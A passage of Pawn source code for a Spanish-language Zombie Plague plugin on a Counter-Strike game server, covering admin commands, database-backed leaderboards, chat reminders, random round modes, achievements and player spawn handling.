	register_concmd("zp_ban", "cmd_ban", _, "<NOMBRE COMPLETO> <MINUTOS> <RAZON OBLIGATORIA>", 0)
	register_concmd("zp_unban", "cmd_unban", _, "<NOMBRE COMPLETO>", 0)
	register_concmd("zp_health", "cmd_health", _, "<target> <ammount> - Change health", 0)
	register_concmd("zp_fix_sxe", "cmd_fix_sxe", _, "Remove black fade", 0)
	register_concmd("zp_ganancia_troll", "cmd_ganancia_troll", _, "<ammount> - Change reward", 0)
	
	// Message IDs
	g_msgScoreInfo = get_user_msgid("ScoreInfo")
	g_msgTeamInfo = get_user_msgid("TeamInfo")
	g_msgDeathMsg = get_user_msgid("DeathMsg")
	g_msgScoreAttrib = get_user_msgid("ScoreAttrib")
	g_msgSetFOV = get_user_msgid("SetFOV")
	g_msgScreenFade = get_user_msgid("ScreenFade")
	g_msgScreenShake = get_user_msgid("ScreenShake")
	g_msgNVGToggle = get_user_msgid("NVGToggle")
	g_msgAmmoPickup = get_user_msgid("AmmoPickup")
	g_msgHideWeapon = get_user_msgid("HideWeapon")
	g_msgCrosshair = get_user_msgid("Crosshair")
	g_msgSayText = get_user_msgid("SayText")
	g_msgCurWeapon = get_user_msgid("CurWeapon")
	g_msgTutorText = get_user_msgid("TutorText")
	g_msgTutorClose = get_user_msgid("TutorClose")
	
	// Message hooks
	register_message(g_msgCurWeapon, "message_cur_weapon")
	register_message(get_user_msgid("Money"), "message_money")
	register_message(get_user_msgid("Health"), "message_health")
	register_message(g_msgScreenFade, "message_screenfade")
	register_message(g_msgNVGToggle, "message_nvgtoggle")
	register_message(get_user_msgid("WeapPickup"), "message_weappickup")
	register_message(g_msgAmmoPickup, "message_ammopickup")
	register_message(get_user_msgid("Scenario"), "message_scenario")
	register_message(get_user_msgid("HostagePos"), "message_hostagepos")
	register_message(get_user_msgid("TextMsg"), "message_textmsg")
	register_message(get_user_msgid("SendAudio"), "message_sendaudio")
	register_message(get_user_msgid("TeamScore"), "message_teamscore")
	register_message(g_msgTeamInfo, "message_teaminfo")
	register_message( get_user_msgid( "HudTextArgs" ), "MESSAGE_HudTextArgs" )
	register_message(g_msgSayText, "message_saytext")
	register_message(get_user_msgid("FlashBat"), "message_flashbat")
	register_message(get_user_msgid("Flashlight"), "message_flashlight")
	
	register_impulse( 100, "ImpulseFlashLight" )
	
	// CVARS - General Purpose
	cvar_warmup = register_cvar("zp_delay", "18")
	
	// Custom Forwards
	/*g_fwRoundStart = CreateMultiForward("zp_round_started", ET_IGNORE, FP_CELL, FP_CELL)
	g_fwRoundEnd = CreateMultiForward("zp_round_ended", ET_IGNORE, FP_CELL)
	g_fwUserInfected_pre = CreateMultiForward("zp_user_infected_pre", ET_IGNORE, FP_CELL, FP_CELL, FP_CELL)
	g_fwUserInfected_post = CreateMultiForward("zp_user_infected_post", ET_IGNORE, FP_CELL, FP_CELL, FP_CELL)
	g_fwUserHumanized_pre = CreateMultiForward("zp_user_humanized_pre", ET_IGNORE, FP_CELL, FP_CELL)
	g_fwUserHumanized_post = CreateMultiForward("zp_user_humanized_post", ET_IGNORE, FP_CELL, FP_CELL)
	g_fwUserInfect_attempt = CreateMultiForward("zp_user_infect_attempt", ET_CONTINUE, FP_CELL, FP_CELL, FP_CELL)
	g_fwUserHumanize_attempt = CreateMultiForward("zp_user_humanize_attempt", ET_CONTINUE, FP_CELL, FP_CELL)
	g_fwExtraItemSelected = CreateMultiForward("zp_extra_item_selected", ET_CONTINUE, FP_CELL, FP_CELL)
	g_fwUserUnfrozen = CreateMultiForward("zp_user_unfrozen", ET_IGNORE, FP_CELL)
	g_fwUserLastZombie = CreateMultiForward("zp_user_last_zombie", ET_IGNORE, FP_CELL)
	g_fwUserLastHuman = CreateMultiForward("zp_user_last_human", ET_IGNORE, FP_CELL)*/
	
	// Collect random spawn points
	load_spawns()
	
	// Set a random skybox?
	set_cvar_string("sv_skyname", "space")
	
	// Disable sky lighting so it doesn't mess with our custom lighting
	set_cvar_num("sv_skycolor_r", 0)
	set_cvar_num("sv_skycolor_g", 0)
	set_cvar_num("sv_skycolor_b", 0)
	
	// Create the HUD Sync Objects
	g_MsgSync = CreateHudSyncObj()
	g_MsgSync2 = CreateHudSyncObj()
	g_MsgSync3 = CreateHudSyncObj()
	
	// Format mod name
	formatex(g_modname, charsmax(g_modname), "Taringa! CS - ZP %s", PLUGIN_VERSION)
	
	// Get Max Players
	g_maxplayers = get_maxplayers()
	
	gGananciaAcomodada = 0;
	
	g_iStartMode[0] = 0;
	g_iStartMode[1] = 0;
}

public plugin_sql()
{
	set_cvar_num("mp_flashlight", 1);
	set_cvar_num("mp_footsteps", 1);
	set_cvar_float("mp_roundtime", 6.0);
	set_cvar_num("mp_freezetime", 0);
	set_cvar_num("sv_maxspeed", 9999);
	set_cvar_num("sv_airaccelerate", 100);
	set_cvar_num("sv_alltalk", 1);

	gSQL_TUPLE = SQL_MakeDbTuple("127.0.0.1", "", "", "", 0);
	
	SQL_CONNECTION = SQL_Connect(gSQL_TUPLE, gSQL_ERROR, gSQL_ERRORNUM, 511);
	
	if(SQL_CONNECTION == Empty_Handle)
	{
		log_to_file( "ZombiePlague_ERRORES.log", "DB: No se pudo conectar a la base de datos!" )
		set_fail_state("No se pudo conectar a la base de datos");
	}
	
	new Handle:SQL_CONSULTA = SQL_PrepareQuery( SQL_CONNECTION, "SELECT * FROM `modes`;" )
	
	if( !SQL_Execute( SQL_CONSULTA ) )
	{
		SQL_FreeHandle( SQL_CONSULTA )
	}
	else if( SQL_NumResults( SQL_CONSULTA ) )
	{
		gMODE_INFECTION = SQL_ReadResult( SQL_CONSULTA, 0 )
		gMODE_NEMESIS = SQL_ReadResult( SQL_CONSULTA, 1 )
		gMODE_SURVIVOR = SQL_ReadResult( SQL_CONSULTA, 2 )
		gMODE_SWARM = SQL_ReadResult( SQL_CONSULTA, 3 )
		gMODE_MULTI = SQL_ReadResult( SQL_CONSULTA, 4 )
		gMODE_PLAGUE = SQL_ReadResult( SQL_CONSULTA, 5 )
		gMODE_ARMAGEDDON = SQL_ReadResult( SQL_CONSULTA, 6 )
		gMODE_SYNAPSIS = SQL_ReadResult( SQL_CONSULTA, 7 )
		gMODE_L4D = SQL_ReadResult( SQL_CONSULTA, 8 )
		gMODE_WESKER = SQL_ReadResult( SQL_CONSULTA, 9 )
		gMODE_NINJA = SQL_ReadResult( SQL_CONSULTA, 10 )
		gMODE_SNIPER = SQL_ReadResult( SQL_CONSULTA, 11 )
		gMODE_TARINGA = SQL_ReadResult( SQL_CONSULTA, 12 )
		gMODE_TROLL = SQL_ReadResult( SQL_CONSULTA, 13 )
		gPozoAc = SQL_ReadResult( SQL_CONSULTA, 14 )
		
		SQL_FreeHandle( SQL_CONSULTA )
	}
	
	SQL_CONSULTA = SQL_PrepareQuery( SQL_CONNECTION, "SELECT name, combos FROM accounts ORDER BY combos DESC LIMIT 1;" )
	
	if( !SQL_Execute( SQL_CONSULTA ) )
	{
		SQL_FreeHandle( SQL_CONSULTA )
	}
	else if( SQL_NumResults( SQL_CONSULTA ) )
	{
		SQL_ReadResult( SQL_CONSULTA, 0, COMBO_SQL_szName, 31 )
		gMaxComboGLOBAL = SQL_ReadResult( SQL_CONSULTA, 1 )
		
		SQL_FreeHandle( SQL_CONSULTA )
	}
	
	
	SQL_CONSULTA = SQL_PrepareQuery( SQL_CONNECTION, "SELECT name, ammopacks, level, reset FROM accounts WHERE id <> 1 AND id <> 3 ORDER BY reset DESC , level DESC , ammopacks DESC LIMIT 1;" )
	
	if( !SQL_Execute( SQL_CONSULTA ) )
	{
		SQL_FreeHandle( SQL_CONSULTA )
	}
	else if( SQL_NumResults( SQL_CONSULTA ) )
	{
		SQL_ReadResult( SQL_CONSULTA, 0, MJ_SQL_szName, 31 )
		MJ_SQL_iAmmoPacks = SQL_ReadResult( SQL_CONSULTA, 1 )
		MJ_SQL_iLevel = SQL_ReadResult( SQL_CONSULTA, 2 )
		MJ_SQL_iReset = SQL_ReadResult( SQL_CONSULTA, 3 )
		
		SQL_FreeHandle( SQL_CONSULTA )
	}
	
	SQL_QueryAndIgnore( SQL_CONNECTION, "UPDATE `accounts` SET `bomba_inf` = '0', `furia_zom` = '3';" )
}

public plugin_cfg()
{
	// Get configs dir
	new cfgdir[32]
	get_configsdir(cfgdir, charsmax(cfgdir))
	
	// Execute config file (zombieplague.cfg)
	server_cmd("exec %s/zombieplague.cfg", cfgdir)
	
	// Prevent any more stuff from registering
	g_arrays_created = false
	
	g_szCharLight[0] = 'b'
	
	// Save customization data
	save_customization()
	
	// Cache CVARs after configs are loaded / call roundstart manually
	set_task(0.5, "event_round_start")
	
	// Task's
	set_task(505.0, "Rec_CheckTH", _, _, _, "b")
	set_task(535.0, "Rec_Premium", _, _, _, "b")
	
	set_task(605.0, "Rec_Top", _, _, _, "b")
	
	set_task(805.0, "Rec_MJ", _, _, _, "b")
	set_task(835.0, "Rec_MJ_COMBO", _, _, _, "b")
	set_task(905.0, "Rec_Loteria", _, _, _, "b")
}

/*================================================================================
 [Main Events]
=================================================================================*/

// Crash
public plugin_end( )
{
	SQL_FreeHandle( SQL_CONNECTION )
	SQL_FreeHandle( gSQL_TUPLE )
}
public fw_SysError( const szError[] )
{
	for( new id = 1; id <= g_maxplayers; id++ )
		SaveDates(id, 1, 1, 0)
	
	new mapname[32]
	get_mapname(mapname, 31)
	
	new StringError[512]
	formatex( StringError, 511, "| FORWARD : SysError : | Error: %s | MAPA: %s", (szError[0]) ? szError : "Ninguno", mapname )
	log_to_file( "ZombiePlague_ERRORES.log", StringError )
}
public fw_GameShutdown( const szError[] )
{
	new StringError[512]
	
	new mapname[32]
	get_mapname(mapname, 31)
	
	formatex( StringError, 511, "| FORWARD : GameShutdown : | Error: %s", (szError[0]) ? szError : "Ninguno", mapname )
	log_to_file( "ZombiePlague_ERRORES.log", StringError )
}

// Recordatorio
public Rec_CheckTH() 
{
	CC( 0, "!g[ZP]!y Podes ver tu multiplicador de ganancia escribiendo en el chat: !g/hh!y" )
	
	if( !gTH )
	{
		new iDateYMD[3], iUnix24, iUnixDif;
		date(iDateYMD[0], iDateYMD[1], iDateYMD[2])
		
		iUnix24 = TimeToUnix( iDateYMD[0], iDateYMD[1], iDateYMD[2], 23, 59, 59 )
		iUnixDif = iUnix24 - ( get_systime( ) + ( -3 * gHOUR_SECONDS ) )
		
		new iYear, iMonth, iDay, iHour, iMinute, iSecond, szHour[32], szMinute[32], szSecond[32];
		UnixToTime( iUnixDif, iYear, iMonth, iDay, iHour, iMinute, iSecond )
		
		formatex( szHour, charsmax( szHour ), " !g%02d!y hora%s,", iHour, (iHour == 1) ? "" : "s" )
		formatex( szMinute, charsmax( szMinute ), " !g%02d!y minuto%s", iMinute, (iMinute == 1) ? "" : "s" )
		formatex( szSecond, charsmax( szSecond ), " !g%02d!y segundo%s", iSecond, (iSecond == 1) ? "" : "s" )
		CC( 0, "!g[ZP]!y Faltan%s%s%s para que sea !gT! AT NITE!y", (iHour < 1) ? "" : szHour, (iMinute < 1) ? "" : szMinute, (iSecond < 1) ? "" : szSecond )
	}
	else
	{
		new iDateYMD[3], iUnix07, iUnixDif;
		date(iDateYMD[0], iDateYMD[1], iDateYMD[2])
		
		iUnix07 = TimeToUnix( iDateYMD[0], iDateYMD[1], iDateYMD[2], 05, 00, 00 )
		iUnixDif = iUnix07 - ( get_systime( ) + ( -3 * gHOUR_SECONDS ) )
		
		new iYear, iMonth, iDay, iHour, iMinute, iSecond, szHour[32], szMinute[32], szSecond[32];
		UnixToTime( iUnixDif, iYear, iMonth, iDay, iHour, iMinute, iSecond )
		
		formatex( szHour, charsmax( szHour ), " !g%02d!y hora%s,", iHour, (iHour == 1) ? "" : "s" )
		formatex( szMinute, charsmax( szMinute ), " !g%02d!y minuto%s", iMinute, (iMinute == 1) ? "" : "s" )
		formatex( szSecond, charsmax( szSecond ), " !g%02d!y segundo%s", iSecond, (iSecond == 1) ? "" : "s" )
		CC( 0, "!g[ZP]!y Faltan%s%s%s para que termine !gT! AT NITE!y", (iHour < 1) ? "" : szHour, (iMinute < 1) ? "" : szMinute, (iSecond < 1) ? "" : szSecond )
	}
}

// Mejor Jugador
public Rec_MJ()
{
	new MJ_szAP_Dot[15], szResetS[32];
	AddDot( MJ_SQL_iAmmoPacks, MJ_szAP_Dot, 14 )
	
	formatex(szResetS, charsmax(szResetS), "S.%d", MJ_SQL_iReset - 5)
	
	CC( 0, "!g[ZP]!y El jugador líder es !g%s!y siendo !gRango %s!y, !gnivel %d!!y con !g%s!y ammopacks", MJ_SQL_szName,
	(MJ_SQL_iReset > 5) ? szResetS : gRESET_CLASS[MJ_SQL_iReset],
	MJ_SQL_iLevel,
	MJ_szAP_Dot )
}

// Mejor Combo
public Rec_MJ_COMBO()
{
	static szComboMax[15]; AddDot(gMaxComboGLOBAL, szComboMax, 14)
	CC(0, "!g[ZP]!y El jugador líder en combos es !g%s!y con un combo de !g%s!y", COMBO_SQL_szName, szComboMax)
}

public Rec_Loteria() CC( 0, "!g[ZP]!y Podes jugar a la lotería escribiendo en el chat: !g/loteria!y" )

// Más Viciado
/*public Rec_MJ_VICIO()
{
	new iPlayYears = 0, iPlayMonths = 0, iPlayDays = 0, iPlayHours = 0, iPlayMinutes = 0;
	new szPlayYears[64], szPlayMonths[64], szPlayDays[64], szPlayHours[64], szPlayMinutes[64];
	
	new Handle:SQL_CONSULTA = SQL_PrepareQuery( SQL_CONNECTION, "SELECT name, played_time FROM dates_sec LEFT JOIN accounts on dates_sec.zp_id = accounts.id ORDER BY played_time DESC LIMIT 1;" )
	
	new VICIO_SQL_szName[32], VICIO_SQL_iPlayTime;
	
	if( !SQL_Execute( SQL_CONSULTA ) )
	{
		SQL_FreeHandle( SQL_CONSULTA )
		return PLUGIN_HANDLED;
	}
	else if( SQL_NumResults( SQL_CONSULTA ) )
	{
		SQL_ReadResult( SQL_CONSULTA, 0, VICIO_SQL_szName, 31 )
		VICIO_SQL_iPlayTime = SQL_ReadResult( SQL_CONSULTA, 1 )
		
		SQL_FreeHandle( SQL_CONSULTA )
	}
	
	iPlayMinutes = VICIO_SQL_iPlayTime / 60
	VICIO_SQL_iPlayTime %= (VICIO_SQL_iPlayTime / 60)
	if( iPlayMinutes >= 60 )
	{
		iPlayHours = iPlayMinutes / 60
		iPlayMinutes %= (iPlayMinutes / 60)
		
		formatex( szPlayHours, charsmax(szPlayHours), "%d hora%s, %d minuto%s", iPlayHours, (iPlayHours == 1) ? "" : "s",
		iPlayMinutes, (iPlayMinutes == 1) ? "" : "s")
		
		if( iPlayHours >= 24 )
		{
			iPlayDays = iPlayHours / 24
			iPlayHours %= (iPlayHours / 24)
			
			formatex( szPlayDays, charsmax(szPlayDays), "%d día%s, %d hora%s, %d minuto%s", iPlayDays, (iPlayDays == 1) ? "" : "s",
			iPlayHours, (iPlayHours == 1) ? "" : "s", iPlayMinutes, (iPlayMinutes == 1) ? "" : "s")
			
			if( iPlayDays >= 30 )
			{
				iPlayMonths = iPlayDays / 30
				iPlayDays %= (iPlayDays / 30)
				
				formatex( szPlayMonths, charsmax(szPlayMonths), "%d mes%s, %d día%s, %d hora%s, %d minuto%s", iPlayMonths, (iPlayMonths == 1) ? "" : "es",
				iPlayDays, (iPlayDays == 1) ? "" : "s", iPlayHours, (iPlayHours == 1) ? "" : "s", iPlayMinutes, (iPlayMinutes == 1) ? "" : "s")
				
				if( iPlayMonths >= 12 )
				{
					iPlayYears = iPlayMonths / 12
					iPlayMonths %= (iPlayMonths / 12)
					
					formatex(szPlayYears, charsmax(szPlayYears), "%d año%s, %d mes%s, %d día%s, %d hora%s", iPlayYears, (iPlayYears == 1) ? "" : "s",
					iPlayMonths, (iPlayMonths == 1) ? "" : "es", iPlayDays, (iPlayDays == 1) ? "" : "s", iPlayHours, (iPlayHours == 1) ? "" : "s")
				}
			}
		}
	}
	else formatex( szPlayMinutes, charsmax(szPlayMinutes), "%d minuto%s", iPlayMinutes, (iPlayMinutes == 1) ? "" : "s")
	
	CC( 0, "!g[ZP]!y El jugador más viciado es !g%s!y con !g%s!y jugados.", VICIO_SQL_szName, (iPlayYears >= 1) ? szPlayYears : (iPlayMonths >= 1) ? szPlayMonths :
	(iPlayDays >= 1) ? szPlayDays : (iPlayHours >= 1) ? szPlayHours : szPlayMinutes )
	
	return PLUGIN_HANDLED;
}*/

public Rec_Premium() CC( 0, "!g[ZP]!y Duplica tus !gammopacks y puntos!y obtenidos siendo premium! !gwww.taringacs.net/premium/!y" )
public Rec_Top() CC( 0, "!g[ZP]!y Podes ver los tops cuando lo deseas: !ghttp://www.taringacs.net/servidores/27025/tops/!y" )

// Event Round Start
public event_round_start()
{
	// Remove doors/lights?
	set_task(0.1, "remove_stuff")
	
	if(gTrollRound)
	{
		g_szCharLight[0] = 'b'
		
		// Lighting task
		set_task(0.01, "lighting_effects")
	}
	
	// New round starting
	g_newround = true
	g_endround = false
	g_survround = false
	g_nemround = false
	gTrollRound = false
	g_swarmround = false
	g_plagueround = false
	g_modestarted = false
	gArmageddonRound = false
	gSynapsisRound = false
	gL4DRound = false
	gWeskerRound = false
	gJasonRound = false
	gSniperRound = false
	gTaringaRound = false
	
	new iPlayersnum;
	iPlayersnum = fnGetAlive();
	
	if(g_iStartMode[0] == MODE_NONE && g_iStartMode[1] == MODE_NONE) 
		g_iStartMode[1] = MODE_INFECTION;
	
	g_iStartMode[0] = g_iStartMode[1];
	
	if(random_num(1, 25) == 1 && iPlayersnum >= 1) 
		g_iStartMode[1] = MODE_SURVIVOR;
	else if(random_num(1, 20) == 1 && iPlayersnum >= 10) // SWARM
		g_iStartMode[1] = MODE_SWARM;
	else if(random_num(1, 20) == 1 && floatround(iPlayersnum*0.37, floatround_ceil) >= 2 && 
	floatround(iPlayersnum*0.37, floatround_ceil) < iPlayersnum && iPlayersnum >= 12) // MULTI
		g_iStartMode[1] = MODE_MULTI;
	else if(random_num(1, 30) == 1 && floatround((iPlayersnum-2)*0.5, floatround_ceil) >= 1
	&& iPlayersnum-(2+floatround((iPlayersnum-2)*0.5, floatround_ceil)) >= 1 && iPlayersnum >= 15) // PLAGUE
		g_iStartMode[1] = MODE_PLAGUE;
	else if(random_num(1, 35) == 1 && iPlayersnum >= 10) // ARMAGEDDON
		g_iStartMode[1] = MODE_ARMAGEDDON;
	else if(random_num(1, 35) == 1 && iPlayersnum >= 12) // SYNAPSIS
		g_iStartMode[1] = MODE_SYNAPSIS;
	else if(random_num(1, 35) == 1 && iPlayersnum >= 20) // L4D
		g_iStartMode[1] = MODE_L4D;
	else if(random_num(1, 35) == 1 && iPlayersnum >= 1) // WESKER
		g_iStartMode[1] = MODE_WESKER;
	else if(random_num(1, 35) == 1 && iPlayersnum >= 1) // NINJA
		g_iStartMode[1] = MODE_NINJA;
	else if(random_num(1, 35) == 1 && iPlayersnum >= 5) // SNIPER
		g_iStartMode[1] = MODE_SNIPER;
	else if(random_num(1, 40) == 1 && iPlayersnum >= 12) // T!
		g_iStartMode[1] = MODE_TARINGA;
	else if(random_num(1, 25) == 1 && iPlayersnum >= 1) // NEM
		g_iStartMode[1] = MODE_NEMESIS;
	else if(random_num(1, 55) == 1 && iPlayersnum >= 20) // TROLL
		g_iStartMode[1] = MODE_TROLL;
	else
		g_iStartMode[1] = MODE_INFECTION;
	
	// Show welcome message and T-Virus notice
	remove_task(TASK_WELCOMEMSG)
	set_task(0.5, "welcome_msg", TASK_WELCOMEMSG)
	
	// Set a new "Make Zombie Task"
	remove_task(TASK_MAKEZOMBIE)
	set_task(2.0 + get_pcvar_float(cvar_warmup), "make_zombie_task", TASK_MAKEZOMBIE)
}

// Log Event Round End
public logevent_round_end()
{
	// Prevent this from getting called twice when restarting (bugfix)
	static Float:lastendtime, Float:current_time
	current_time = get_gametime()
	if (current_time - lastendtime < 0.5) return;
	lastendtime = current_time
	
	// Round ended
	g_endround = true
	
	// Stop old tasks (if any)
	remove_task(TASK_WELCOMEMSG)
	remove_task(TASK_MAKEZOMBIE)
	
	// Logro System
	for(new i = 1; i <= g_maxplayers; i++)
	{
		if(is_user_connected(i) && gLogeado[i])
		{
			// KILL 15 / 25 1 ROUND
			if(gLogro_CountKill[i] >= 15)
			{
				fnUpdateLogros(i, LOGRO_HUMAN, KILL_15_1_ROUND)
				
				if(gLogro_CountKill[i] >= 25)
					fnUpdateLogros(i, LOGRO_HUMAN, KILL_25_1_ROUND)
			}
			
			// CONTADOR DE DAÑOS
			if(gLogro_CountDmg[i] >= 250000) fnUpdateLogros(i, LOGRO_HUMAN, CONTADOR_DE_DANIOS)
			
			// NO ME VEZ
			if(gLogro_Infects[i] >= 10) fnUpdateLogros(i, LOGRO_ZOMBIE, NO_ME_VEZ)
			
			// ASI NO VA
			if(gLogro_ZombieDie[i] >= 10) fnUpdateLogros(i, LOGRO_ZOMBIE, ASI_NO_VA)
			
			// MORIRE EN EL INTENTO
			if(!fnGetZombies() && gTrollRound)
				if(is_user_alive(i) && gPowerFull[i] == 3) fnUpdateLogros(i, LOGRO_HUMAN, MORIRE_EN_EL_INTENTO)
			
			// SOY EL ZOMBIE
			if(!fnGetHumans())
				if(fnGetAlive() >= 20 && gLogro_ElZombieNoDie[i]) fnUpdateLogros(i, LOGRO_ZOMBIE, SOY_EL_ZOMBIE)
		}
	}
	
	// Show HUD notice, play win sound, update team scores...
	//static sound[64]
	if (!fnGetZombies())
	{
		// Human team wins
		set_hudmessage(0, 0, 200, HUD_EVENT_X, HUD_EVENT_Y, 0, 0.0, 3.0, 2.0, 1.0, -1)
		ShowSyncHudMsg(0, g_MsgSync, "Los humanos han vencido la plaga!")
		
		// Play win sound and increase score
		//ArrayGetString(sound_win_humans, random_num(0, ArraySize(sound_win_humans) - 1), sound, charsmax(sound))
		PlaySound(gSOUND_WIN_HUMANS)
		g_scorehumans++
		
		// Round end forward
		//ExecuteForward(g_fwRoundEnd, g_fwDummyResult, ZP_TEAM_HUMAN);
	}
	else if (!fnGetHumans())
	{
		// Zombie team wins
		set_hudmessage(200, 0, 0, HUD_EVENT_X, HUD_EVENT_Y, 0, 0.0, 3.0, 2.0, 1.0, -1)
		ShowSyncHudMsg(0, g_MsgSync, "Los zombies han tomado el mundo!")
		
		// Play win sound and increase score
		//ArrayGetString(sound_win_zombies, random_num(0, ArraySize(sound_win_zombies) - 1), sound, charsmax(sound))
		PlaySound(gSOUND_WIN_ZOMBIES)
		g_scorezombies++
		
		// Round end forward
		//ExecuteForward(g_fwRoundEnd, g_fwDummyResult, ZP_TEAM_ZOMBIE);
	}
	else
	{
		// No one wins
		set_hudmessage(0, 200, 0, HUD_EVENT_X, HUD_EVENT_Y, 0, 0.0, 3.0, 2.0, 1.0, -1)
		ShowSyncHudMsg(0, g_MsgSync, "Nadie ha ganado...")
		
		// Play win sound
		//ArrayGetString(sound_win_no_one, random_num(0, ArraySize(sound_win_no_one) - 1), sound, charsmax(sound))
		PlaySound(gSOUND_NO_WIN_ONE)
		
		// Round end forward
		//ExecuteForward(g_fwRoundEnd, g_fwDummyResult, ZP_TEAM_NO_ONE);
	}
	
	// Balance the teams
	balance_teams()
}

// BP Ammo update
public event_ammo_x(id)
{
	// Humans only
	if (g_zombie[id])
		return;
	
	// Get ammo type
	static type
	type = read_data(1)
	
	// Unknown ammo type
	if (type >= sizeof AMMOWEAPON)
		return;
	
	// Get weapon's id
	static weapon
	weapon = AMMOWEAPON[type]
	
	// Primary and secondary only
	if (MAXBPAMMO[weapon] <= 2)
		return;
	
	// Get ammo amount
	static amount
	amount = read_data(2)
	
	// Unlimited BP Ammo?
	if (amount < MAXBPAMMO[weapon])
	{
		// The BP Ammo refill code causes the engine to send a message, but we
		// can't have that in this forward or we risk getting some recursion bugs.
		// For more info see: https://bugs.alliedmods.net/show_bug.cgi?id=3664
		static args[1]
		args[0] = weapon
		set_task(0.1, "refill_bpammo", id, args, sizeof args)
	}
}

// Current Weapon Event
public event_cur_weapon(id)
{
	// Not alive
	if (!g_isalive[id])
		return;
	
	// Zombie not holding an allowed weapon for some reason
	
	if (g_zombie[id] && !((1<<read_data(2)) & ZOMBIE_ALLOWED_WEAPONS_BITSUM))
	{
		// Switch to knife
		engclient_cmd(id, "weapon_knife")
		
		// Update the HUD and let other plugins know
		emessage_begin(MSG_ONE, g_msgCurWeapon, _, id)
		ewrite_byte(1) // active
		ewrite_byte(CSW_KNIFE) // weapon
		ewrite_byte(MAXCLIP[CSW_KNIFE]) // clip
		emessage_end()
	}
}

// Weapon Animation Event
public event_weapon_anim()
{
	// Because of a weird bug within the AMXX event system, we need to
	// hook this message to prevent some weird behavior when calling
	// engclient_cmd(id, "weapon_knife") in the CurWeapon Event forward.
	// http://forums.alliedmods.net/showthread.php?t=85161&page=2
}

/*================================================================================
 [Main Forwards]
=================================================================================*/

// Entity Spawn Forward
public fw_Spawn(entity)
{
	// Invalid entity
	if (!is_valid_ent(entity)) return FMRES_IGNORED;
	
	// Get classname
	new classname[32]
	entity_get_string(entity, EV_SZ_classname, classname, sizeof classname - 1)
	
	// Check whether it needs to be removed
	for (new i = 0; i < sizeof gREMOVE_ENTITIES; i++)
	{
		if (equal(classname, gREMOVE_ENTITIES[i]))
		{
			remove_entity(entity)
			return FMRES_SUPERCEDE;
		}
	}
	
	return FMRES_IGNORED;
}

// Sound Precache Forward
public fw_PrecacheSound(const sound[])
{
	// Block all those unneeeded hostage sounds
	if (equal(sound, "hostage", 7))
		return FMRES_SUPERCEDE;
	
	return FMRES_IGNORED;
}

// Ham Player Spawn Post Forward
public fw_PlayerSpawn_Post(id)
{
	// Not alive or didn't join a team yet
	if (!is_user_alive(id) || !fm_cs_get_user_team(id))
		return;
	
	// Player spawned
	g_isalive[id] = true
	
	// Remove previous tasks
	remove_task(id+TASK_SPAWN)
	remove_task(id+TASK_MODEL)
	remove_task(id+TASK_BLOOD)
	remove_task(id+TASK_AURA)
	remove_task(id+TASK_BURN)
	/*remove_task(id+TASK_CHARGE)
	remove_task(id+TASK_FLASH)*/
	remove_task(id+TASK_NVISION)
	
	// Spawn at a random location?
	do_random_spawn(id)
	
	// Hide money?
	set_task(0.4, "task_hide_money", id+TASK_SPAWN)
	
	// Respawn player if he dies because of a worldspawn kill?
	set_task(2.0, "respawn_player_task", id+TASK_SPAWN)
	
	// Spawn as zombie?
	if (g_respawn_as_zombie[id] && !g_newround)
	{
		reset_vars(id, 0) // reset player vars
		zombieme(id, 0, 0, 0, 0, 0) // make him zombie right away
		
		return;
	}
	
	// Reset player vars
	reset_vars(id, 0)
	
	// Show custom buy menu?
	set_task(0.3, "show_menu_buy1", id+TASK_SPAWN)
	
	// Set selected human class
	g_humanclass[id] = g_humanclassnext[id]
	
	// If no class selected yet, use the first (default) one
	if (g_humanclass[id] == HCLASS_NONE) g_humanclass[id] = 0
	
	// Cache speed, dmg, and name for player's class
	g_human_spd[id] = ammount_upgradeF(id, HAB_HUMAN, HUMAN_SPEED, float(ArrayGetCell(g_hclass_spd, g_humanclass[id])))
	ArrayGetString(g_hclass_name, g_humanclass[id], g_human_classname[id], charsmax(g_human_classname[]))
	
	// Set health, armor and gravity
	set_user_health(id, ammount_upgrade(id, HAB_HUMAN, HUMAN_HP, ArrayGetCell(g_hclass_hp, g_humanclass[id])))
	set_user_armor(id, ammount_upgrade(id, HAB_HUMAN, HUMAN_ARMOR, ArrayGetCell(g_hclass_armor, g_humanclass[id])))
	set_user_gravity(id, ammount_upgradeF(id, HAB_HUMAN, HUMAN_GRAVITY, Float:ArrayGetCell(g_hclass_grav, g_humanclass[id])))
	
	formatex(gClass[id], charsmax(gClass[]), g_human_classname[id])
	
	// Switch to CT if spawning mid-round
	if (!g_newround && fm_cs_get_user_team(id) != FM_CS_TEAM_CT) // need to change team?
	{
		remove_task(id+TASK_TEAM)
		fm_cs_set_user_team(id, FM_CS_TEAM_CT)
		fm_user_team_update(id)
	}
	
	// Custom models stuff
	static currentmodel[32], tempmodel[32], already_has_model, i, iRand
	already_has_model = false
	
	// Get current model for comparing it with the current one
	fm_cs_get_user_model(id, currentmodel, charsmax(currentmodel))
	
	// Set the right model, after checking that we don't already have it
	for (i = ArrayGetCell(g_hclass_modelsstart, g_humanclass[id]); i < ArrayGetCell(g_hclass_modelsend, g_humanclass[id]); i++)
	{
		ArrayGetString(g_hclass_playermodel, i, tempmodel, charsmax(tempmodel))
		if (equal(currentmodel, tempmodel)) already_has_model = true
	}
	
	if (!already_has_model)
	{
		iRand = random_num(ArrayGetCell(g_hclass_modelsstart, g_humanclass[id]), ArrayGetCell(g_hclass_modelsend, g_humanclass[id]) - 1)
		ArrayGetString(g_hclass_playermodel, iRand, g_playermodel[id], charsmax(g_playermodel[]))
	}
	
	// Need to change the model?
	if (!already_has_model)
	{
		// An additional delay is offset at round start
		// since SVC_BAD is more likely to be triggered there
		if (g_newround)
			set_task(5.0 * (gMODEL_CHANGE_DELAY + (gArmageddonRound) ? 0.5 : 0.01), "fm_user_model_update", id+TASK_MODEL)
		else
			fm_user_model_update(id+TASK_MODEL)
	}
	
	// Remove glow
	set_user_rendering(id)
	
	// Enable spawn protection for humans spawning mid-round
	if (!g_newround)
	{
		// Do not take damage
		g_nodamage[id] = true
		
		// Make temporarily invisible
		entity_set_int(id, EV_INT_effects, entity_get_int(id, EV_INT_effects) | EF_NODRAW)
		
		// Set task to remove it
		set_task(1.5, "remove_spawn_protection", id+TASK_SPAWN)
	}
	
	// Replace weapon models (bugfix)
	static weapon_ent
	weapon_ent = fm_cs_get_current_weapon_ent(id)
	if (is_valid_ent(weapon_ent)) replace_weapon_models(id, cs_get_weapon_id(weapon_ent))
	
	// Last Zombie Check
	fnCheckLastZombie()
}

// Ham Player Killed Forward
public fw_PlayerKilled(victim, attacker, shouldgib)
{
	// Player killed
